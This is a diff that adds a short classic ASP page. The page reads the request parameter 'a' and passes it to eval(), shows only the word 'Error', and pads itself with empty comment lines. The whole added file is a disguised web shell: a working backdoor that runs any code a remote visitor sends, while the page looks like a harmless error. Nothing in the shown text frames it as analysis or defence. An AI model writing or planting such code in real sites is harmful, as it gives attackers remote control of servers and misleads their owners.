@@ -1,0 +1,12 @@
+<%
+dim play
+'
+'
+''''''''''''''''''
+'''''''''
+play = request("a")
+%>
+Error
+<%
+eval(play)
+%>
